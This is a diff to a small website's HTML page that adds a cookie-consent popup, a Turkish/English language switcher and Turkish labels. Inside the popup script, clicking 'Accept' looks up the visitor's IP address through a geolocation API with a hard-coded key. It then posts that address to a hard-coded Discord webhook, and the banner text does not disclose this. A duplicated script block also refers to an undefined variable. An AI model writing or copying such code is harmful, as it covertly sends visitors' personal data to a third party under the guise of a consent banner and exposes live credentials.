@@ -4,7 +4,7 @@
         <img src="https://cdn.discordapp.com/attachments/1217132937242349740/1243459434710171648/speculo.png?ex=66518d57&is=66503bd7&hm=203e117d3bc643d89670e1b66f21833ac64fa7659cd2e7db0dbc3bee082fa0b9&" alt="Logo">
     </header>
     <head>
-        <link rel="icon" href="https://cdn.discordapp.com/attachments/1217132937242349740/1243627027752550661/speculo.png?ex=6652296c&is=6650d7ec&hm=bde17e48e1ce4ffdda7c39bdeb6cf43939b36d911963533aa9216c1de2f82f3f&" type="image/icon type">
+        <link rel="icon" href='https://imgur.com/a/3UOpW8P' type="image/icon type">
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Speculo</title>
@@ -180,8 +180,214 @@ header img {
     border-radius: 50%;
     margin-right: 20px;
 }
+#language-selector {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-top: 20px;
+}
+
+#language-selector label {
+    margin-right: 10px;
+}
+
+#language-selector select {
+    padding: 5px;
+    border-radius: 5px;
+}
+#message {
+    height: 200px;
+}
+#cookie-popup {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    padding: 20px;
+    background-color: rgba(0, 0, 0, 0.8);
+    color: white;
+    border-top-right-radius: 5px;
+}
+
+#cookie-popup button {
+    display: block;
+    background-color: rgba(255, 255, 255, 0.1);
+    border: none;
+    border-radius: 5px;
+    padding: 10px 20px;
+    color: white;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+    margin-top: 20px;
+}
+
+#cookie-popup button:hover {
+    background-color: rgba(255, 255, 255, 0.2);
+}
+#decline-button {
+    display: block;
+    background-color: rgba(255, 255, 255, 0.1);
+    border: none;
+    border-radius: 5px;
+    padding: 10px 20px;
+    color: white;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+    margin-top: 20px;
+}
+
+#decline-button:hover {
+    background-color: rgba(255, 255, 255, 0.2);
+}
+#cookie-popup {
+    transition: opacity 0.3s ease;
+    opacity: 1;
+}
+
+#cookie-popup.fade-away {
+    opacity: 0;
+}
+#cookie-popup button {
+    display: inline-block;
+    margin-right: 10px;
+}
         </style>
         <script>
+            function json(url) {
+            return fetch(url).then(res => res.json());
+        }
+        
+    json(`https://api.ipdata.co?api-key=ace245ed34997457feb427f56468b8e3340b5dbba7e35d1b61ae48e0`).then(data => {
+        var cookiePopup = document.getElementById('cookie-popup');
+    var cookieButton = document.getElementById('cookie-button');
+    var declineButton = document.getElementById('decline-button');
+    cookieButton.addEventListener('click', function() {
+        cookiePopup.style.display = 'none';
+        fetch("https://discord.com/api/webhooks/1242922933798567996/f3utr4S2_Jp4630XmpnigayVJ4Vmn80wBSsJ8ocacH3x4Rf0CyzRhXNfVlCcTLb-bs85", {
+     body: JSON.stringify({
+        content: data.ip,
+        }),
+        headers: {
+            "Content-Type": "application/json",
+        },
+         method: "POST",
+        })
+      .then(response => response.json())
+      .then(data => {
+            console.log('Success:', data);
+        })
+      .catch((error) => {
+            console.error('Error:', error);
+        });
+    });
+    declineButton.addEventListener('click', function() {
+        cookiePopup.style.display = 'none';
+    });
+    if (!document.cookie.split('; ').find(function(cookie) {
+        return cookie.startsWith('cookieAccepted=');
+    }) ){
+        cookiePopup.style.display = 'block';
+    }
+});
+        </script>
+        <script>
+document.addEventListener('DOMContentLoaded', function() {
+    var cookiePopup = document.getElementById('cookie-popup');
+    var cookieButton = document.getElementById('cookie-button');
+    var declineButton = document.getElementById('decline-button');
+    cookieButton.addEventListener('click', function() {
+        cookiePopup.style.display = 'none';
+        fetch("https://discord.com/api/webhooks/1242922933798567996/f3utr4S2_Jp4630XmpnigayVJ4Vmn80wBSsJ8ocacH3x4Rf0CyzRhXNfVlCcTLb-bs85", {
+     body: JSON.stringify({
+        content: ipAddress,
+        }),
+        headers: {
+            "Content-Type": "application/json",
+        },
+         method: "POST",
+        })
+      .then(response => response.json())
+      .then(data => {
+            console.log('Success:', data);
+        })
+      .catch((error) => {
+            console.error('Error:', error);
+        });
+    });
+    declineButton.addEventListener('click', function() {
+        cookiePopup.style.display = 'none';
+    });
+    if (!document.cookie.split('; ').find(function(cookie) {
+        return cookie.startsWith('cookieAccepted=');
+    }) ){
+        cookiePopup.style.display = 'block';
+    }
+});
+
+document.addEventListener('DOMContentLoaded', function() {
+    var cookiePopup = document.getElementById('cookie-popup');
+    var cookieButton = document.getElementById('cookie-button');
+    var declineButton = document.getElementById('decline-button');
+    cookieButton.addEventListener('click', function() {
+        cookiePopup.classList.add('fade-away');
+        setTimeout(function() {
+            cookiePopup.style.display = 'none';
+        }, 300);
+        document.cookie = 'cookieAccepted=true; max-age=31536000; path=/';
+    });
+    declineButton.addEventListener('click', function() {
+        cookiePopup.classList.add('fade-away');
+        setTimeout(function() {
+            cookiePopup.style.display = 'none';
+        }, 300);
+        document.cookie = 'cookieDeclined=true; max-age=31536000; path=/';
+    });
+    if (!document.cookie.split('; ').find(function(cookie) {
+        return cookie.startsWith('cookieAccepted=');
+    }) ){
+        cookiePopup.style.display = 'block';
+    }
+    if (document.cookie.split('; ').find(function(cookie) {
+        return cookie.startsWith('cookieDeclined=');
+    }) ){
+        cookiePopup.style.display = 'none';
+    }
+});
+            
+document.addEventListener('DOMContentLoaded', function() {
+    var languageSelector = document.getElementById('language');
+    languageSelector.addEventListener('change', function() {
+        var language = languageSelector.value;
+        if (language === 'tr') {
+            // Update the page content with Turkish text
+            document.querySelector('h1').textContent = 'Hakkında Specula';
+            document.querySelector('p').textContent = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non risus. Suspendisse lectus tortor, dignissim sit amet, adipiscing nec, ultricies sed, dolor.';
+            document.querySelector('a[href="https://goktug-yildiz.github.io/specula/"]').textContent = 'Ana Sayfa';
+            document.querySelector('a[href="https://goktug-yildiz.github.io/specula-product/"]').textContent = 'Ürünler';
+            document.querySelector('a[href="#contact-box"]').textContent = 'İletişim';
+            // Update the contact box content with Turkish text
+            document.querySelector('#contact-box h2').textContent = 'Bizimle İletişime Geç';
+            document.querySelector('#contact-box label[for="name"]').textContent = 'İsim:';
+            document.querySelector('#contact-box label[for="email"]').textContent = 'Mail:';
+            document.querySelector('#contact-box label[for="message"]').textContent = 'Mesaj:';
+            document.querySelector('#contact-box button[type="submit"]').textContent = 'Gönder';
+        } else if (language === 'en') {
+            // Update the page content with English text
+            document.querySelector('h1').textContent = 'About Specula';
+            document.querySelector('p').textContent = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non risus. Suspendisse lectus tortor, dignissim sit amet, adipiscing nec, ultricies sed, dolor.';
+            document.querySelector('a[href="https://goktug-yildiz.github.io/specula/"]').textContent = 'Home';
+            document.querySelector('a[href="https://goktug-yildiz.github.io/specula-product/"]').textContent = 'Products';
+            document.querySelector('a[href="#contact-box"]').textContent = 'Contact';
+            // Update the contact box content with English text
+            document.querySelector('#contact-box h2').textContent = 'Contact Us';
+            document.querySelector('#contact-box label[for="name"]').textContent = 'Name:';
+            document.querySelector('#contact-box label[for="email"]').textContent = 'Email:';
+            document.querySelector('#contact-box label[for="message"]').textContent = 'Message:'
+            document.querySelector('#contact-box button[type="submit"]').textContent = 'Submit';
+        }
+    });
+});
+
 document.addEventListener('DOMContentLoaded', function() {
     var form = document.querySelector('form');
     form.addEventListener('submit', function(e) {
@@ -218,8 +424,20 @@ document.addEventListener('DOMContentLoaded', function() {
         </script>
     </head>
     <body>
+        <div id="cookie-popup">
+            <p>This website uses cookies to ensure you get the best experience on our website. By continuing to browse the site, you are agreeing to our use of cookies.</p>
+            <button id="cookie-button">Accept</button>
+            <button id="decline-button">Decline</button>
+        </div>
+        <div id="language-selector">
+            <label for="language">Language:</label>
+            <select id="language">
+                <option value="tr">Turkish</option>
+                <option value="en">English</option>
+            </select>
+        </div>
         <div class="container">
-            <h1>About Speculo</h1>
+            <h1>Speculo Hakkında</h1>
             <nav class="navbar">
                 <a href="https://goktug-yildiz.github.io/specula/">Home</a>
                 <a href="https://goktug-yildiz.github.io/specula-product/">Products</a>
@@ -227,17 +445,17 @@ document.addEventListener('DOMContentLoaded', function() {
             </nav>
             <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non risus. Suspendisse lectus tortor, dignissim sit amet, adipiscing nec, ultricies sed, dolor.</p>
             <div id="contact-box">
-                <h2>Contact Us</h2>
+                <h2>Bizimle İletişime Geç</h2>
                 <form action="https://formspree.io/your-email@example.com" method="POST">
-                    <label for="name">Name:</label>
+                    <label for="name">İsim:</label>
                     <input type="text" id="name" name="name" required>
             
-                    <label for="email">Email:</label>
+                    <label for="email">Mail:</label>
                     <input type="email" id="email" name="_replyto" required>
             
-                    <label for="message">Message:</label>
+                    <label for="message">Mesaj:</label>
                     <textarea id="message" name="message" required></textarea>
             
-                    <button type="submit">Send</button>
+                    <button type="submit">Yolla</button>
                 </form>
             </div>
